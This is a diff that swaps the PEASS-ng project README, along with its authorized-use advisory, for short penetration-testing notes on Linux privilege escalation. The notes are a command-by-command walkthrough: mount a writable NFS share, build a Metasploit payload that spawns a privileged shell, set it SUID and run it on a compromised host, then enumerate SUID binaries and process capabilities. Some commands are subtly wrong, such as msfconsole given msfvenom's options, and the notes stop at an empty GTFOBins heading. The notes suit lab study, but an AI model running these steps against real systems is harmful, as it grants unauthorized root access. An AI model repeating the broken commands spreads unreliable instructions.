@@ -1,47 +1,96 @@
 
 
+---
 
-# LINUXpev - Privilege Escalation Awesome Scripts SUITE new generation
+# Linux Privilege Escalation
 
-![](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/linPEAS/images/peass.png)
+## NFS Exploit
 
-![](https://img.shields.io/badge/Black-Arch-black) ![](https://img.shields.io/badge/Arch-AUR-brightgreen) ![](https://img.shields.io/badge/Black%20Hat%20Arsenal-Asia%202020-red)
+To check if the attacker machine mount is possible:
+```sh
+cat /etc/exports
+```
 
+Use Nmap to check the NFS mount:
+```sh
+nmap --script=nfs-showmount 10.10.x.x
+```
+*(Note: (sync) means write)*
 
+### To set up the mount point on a local machine and create a temporary directory:
 
+1. On the local machine, create a temporary directory:
+    ```sh
+    mkdir /tmp/nfs
+    ```
 
-Here you will find **privilege escalation tools for Windows and Linux/Unix\* and MacOS**.
+2. Mount the NFS share:
+    ```sh
+    sudo mount -o rw,vers=3 -t nfs 10.10.x.x:/tmp /tmp/nfs
+    ```
 
-These tools search for possible **local privilege escalation paths** that you could exploit and print them to you **with nice colors** so you can recognize the misconfigurations easily.
+3. Navigate to the `/tmp` directory.
 
-- Check the **Local Windows Privilege Escalation checklist** from **[book.hacktricks.xyz](https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation)**
-- **[WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) - Windows local Privilege Escalation Awesome Script (C#.exe and .bat)**
+### Create a Metasploit Linux exploit with SUID bit set:
 
-- Check the **Local Linux Privilege Escalation checklist** from **[book.hacktricks.xyz](https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist)**
-- **[LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) - Linux local Privilege Escalation Awesome Script (.sh)**
+1. On the local machine with root privileges, generate the exploit:
+    ```sh
+    msfconsole -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+    ```
 
-## Quick Start
-Find the **latest versions of all the scripts and binaries in [the releases page](https://github.com/carlospolop/PEASS-ng/releases/latest)**.
+2. Give the SUID bit permission to the `shell.elf` file:
+    ```sh
+    chmod +s /tmp/nfs/shell.elf
+    ```
 
-## JSON, HTML & PDF output
-Check the **[parsers](./parsers/)** directory to **transform PEASS outputs to JSON, HTML and PDF**
+### Execute the `shell.elf` file on the compromised machine:
 
-## Support PEASS-ng and HackTricks and get benefits
+1. Navigate to the compromised machine and execute the file:
+    ```sh
+    ./shell.elf
+    ```
 
-Do you want to have **access the latest version of Hacktricks and PEASS**, obtain a **PDF copy of Hacktricks**, and more? Discover the **brand new [SUBSCRIPTION PLANS](https://github.com/sponsors/carlospolop?frequency=one-time) for individuals and companies**.
+---
 
-**LinPEAS, WinPEAS and MacPEAS** aren’t enough for you? Welcome [**The PEASS Family**](https://opensea.io/collection/the-peass-family/), a limited collection of [**exclusive NFTs**](https://opensea.io/collection/the-peass-family/) of our favourite PEASS in disguise, designed by my team. Go **get your favourite and make it yours!** And if you are a **PEASS & Hacktricks enthusiast**, you can get your hands now on **our [custom swag](https://peass.creator-spring.com/) and show how much you like our projects!**
+# Exploit Capabilities
 
-You can also, join the 💬 [Discord group](https://discord.gg/hRep4RUj7f) or the [telegram group](https://t.me/peass) to learn about latest news in cybersecurity and meet other cybersecurity enthusiasts, or follow me on Twitter 🐦 [@carlospolopm](https://twitter.com/carlospolopm).
+## After logging into the compromised machine, check if the capabilities exist:
 
-## Let's improve PEASS together
+### Using LinePeas:
 
-If you want to **add something** and have **any cool idea** related to this project, please let me know it in the **telegram group https://t.me/peass** or contribute reading the **[CONTRIBUTING.md](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/CONTRIBUTING.md)** file.
+To check capabilities:
+```sh
+./linepeas
+```
 
-## Advisory
+### Manual Approach:
 
-All the scripts/binaries of the PEAS suite should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own machines and/or with the owner's permission.
+1. To check the capabilities for SUID bit:
+    ```sh
+    getcap -r / 2>/dev/null
+    ```
 
+2. To find files with SUID bit:
+    ```sh
+    find / -perm /4000 2>/dev/null
+    ```
 
+3. To check the process capabilities:
+    ```sh
+    ps -aux | grep root
+    ```
 
-By Polop<sup>(TM)</sup>
+4. Check any process ID which is running as root:
+    ```sh
+    cat /proc/477/status | grep -i cap
+    ```
+
+5. Convert the hex value to ASCII value:
+    ```sh
+    capsh --decode=000003ffffffff
+    ```
+
+### Use GTFOBins to Exploit:
+
+---
+
